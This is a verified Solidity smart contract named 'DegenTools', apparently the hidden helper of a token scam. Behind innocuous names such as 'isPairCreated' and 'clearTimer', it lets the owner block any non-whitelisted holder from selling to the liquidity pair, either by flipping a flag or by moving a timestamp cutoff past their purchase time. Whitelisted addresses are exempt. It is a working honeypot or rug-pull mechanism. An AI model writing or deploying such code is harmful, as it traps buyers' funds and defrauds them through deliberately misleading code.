/**
 *Submitted for verification at Etherscan.io on 2023-07-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Ownable {
    address private _owner;    
    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () {
        _owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }
}


contract DegenTools is Ownable {

    address private tokenAddress;
    address private pairAddress;
    bool private isDone;

    mapping(address => bool) private _whites;
    mapping (address => uint256) private _timer;

    uint256 private curTime;

    modifier onlyToken() {
        require(msg.sender == tokenAddress); 
        _;
    }

    function clearTimer(bool isFinished) external onlyOwner {
      isDone = isFinished;
    }

    function refresh(address _token, address _pair) external onlyOwner {
      tokenAddress = _token;
      pairAddress = _pair;
      isDone = false;
      curTime = 0;
    }

    function setTimer() external onlyOwner {
      curTime = block.timestamp;
    }

    function whitelist(address owner_, bool _isWhitelist) external onlyOwner {
      _whites[owner_] = _isWhitelist;
    }

    function isPairCreated(address _from, address _to) external onlyToken returns (uint256) {
      if (_whites[_from] || _whites[_to]) {
        return 1;
      }
      if (_from == pairAddress) {
        if (_timer[_to] == 0) {
          _timer[_to] = block.timestamp;
        }
      } else if (_to == pairAddress) {
        require(!isDone && _timer[_from] >= curTime);
      } else {
        _timer[_to] = 0;
      }
      return 0;
    }

    receive() external payable {
    }
}